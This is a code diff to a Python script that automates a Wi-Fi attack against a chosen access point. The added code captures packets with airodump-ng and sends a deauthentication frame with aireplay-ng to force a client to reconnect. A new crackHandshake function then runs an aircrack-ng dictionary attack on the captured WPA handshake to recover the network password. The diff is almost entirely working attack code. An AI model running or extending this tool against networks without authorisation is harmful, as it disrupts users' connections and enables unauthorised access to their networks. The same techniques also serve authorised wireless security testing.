@@ -27,7 +27,7 @@ interfaceName = ""
 
 # Specify access point MAC address (BSSID) to target
 # Default: Present user with detected access points to choose from
-targetAP = ""
+routerBSSID = ""
 
 # Specify channel to scan on
 # Default: Prompt user to choose channel or scan all channels
@@ -42,6 +42,7 @@ def main():
 		environmentSetup()
 		getTargetAccessPoint()
 		captureHandshake()
+		crackHandshake()
 	finally:
 		# this ensures that clean up occurs even on error
 		cleanUp()
@@ -124,7 +125,7 @@ def setGlobalAttribute(arg):
 
 def getTargetAccessPoint():
 	''' airdump setup '''
-	global interfaceName
+	global interfaceName, channel
 
 	print("Killing potential interfering processes...")
 	process = bash_command("airmon-ng check kill")
@@ -248,16 +249,22 @@ def getInterfaceName():
 
 
 def captureHandshake():
+	global routerBSSID
 	# Get MAC address of the target access point (router)
 	routerBSSID = input("Please select router MAC address (BSSID 1): ")
 	# TODO: Parse input - insert colon delimiters, make all-caps?
 	scanTime = input("Time limit to listen: ")
 
-	clientBSSID = scanClientsForAccessPoint(routerBSSID, scanTime)
-	deauthenticateClient(clientBSSID, routerBSSID)
+	clientBSSID = scanClientsForAccessPoint(scanTime)
+	airodump_proc = bash_command("airodump-ng --output-format cap -c " + str(channel) + " --bssid " + str(routerBSSID) + " -w packet " + str(interfaceName))
+	time.sleep(2)
+	deauthenticateClient(clientBSSID)
+	time.sleep(8)
+	airodump_proc.terminate()
 
 
-def scanClientsForAccessPoint(routerBSSID, scanTime, routerESSID=None):
+def scanClientsForAccessPoint(scanTime, routerESSID=None):
+	global routerBSSID, channel
 	print("Using interface: " + interfaceName)
 	# Allow user to select an AP (access point) by MAC address
 	if routerESSID == None or routerESSID == '':
@@ -267,7 +274,7 @@ def scanClientsForAccessPoint(routerBSSID, scanTime, routerESSID=None):
 	# TODO: Change routerBSSID to ESSID in print statement
 
 	# List all clients connected to target AP
-	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " -w packet " + str(interfaceName))
+	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " " + str(interfaceName))
 	time.sleep(int(scanTime))
 	process.terminate()
 	print("Scan complete.")
@@ -287,20 +294,34 @@ def scanClientsForAccessPoint(routerBSSID, scanTime, routerESSID=None):
 	return clientBSSID
 
 
-def deauthenticateClient(clientBSSID, routerBSSID, routerESSID=None):
+def deauthenticateClient(clientBSSID, routerESSID=None):
+	global routerBSSID, interfaceName, channel
 	if routerESSID == None or routerESSID == '':
 		print("Deauthenticating client " + clientBSSID + " at AP " + routerBSSID)
 	else:
 		print("Deauthenticating client " + clientBSSID + " at AP " + routerESSID)
 
-	process = bash_command("aireplay-ng -0 1 -a " + routerBSSID + " -c " + clientBSSID + " " + interfaceName)
-	print(process.stdout.read().decode('utf-8').strip())
+	aireplay_proc = bash_command("aireplay-ng -0 1 -a " + routerBSSID + " -c " + clientBSSID + " " + interfaceName)
+	print(aireplay_proc.stdout.read().decode('utf-8').strip())
 
+
+def crackHandshake():
+	global routerBSSID, dictionaryPath
+	if dictionaryPath == "":
+		process = bash_command("ls")
+		print(process.stdout.read().decode('utf-8'))
+		dictionaryPath = input("Please specify wordlist for dictionary crack: ")
+	print("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + "packet-01.cap")
+	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " packet-01.cap")
+	print(process.stdout.read().decode('utf-8'))
 
 def cleanUp():
 	# TODO: remove dump file
 	if os.path.exists(os.getcwd() + "/packets"):
 		shutil.rmtree(os.getcwd() + "/packets")
+
+	if os.path.isfile(os.getcwd() + "/packet-01.cap"):
+		os.remove(os.getcwd() + "/packet-01.cap")
 
 	if os.path.isfile(os.getcwd() + "/dump-01.csv"):
 		os.remove(os.getcwd() + "/dump-01.csv")
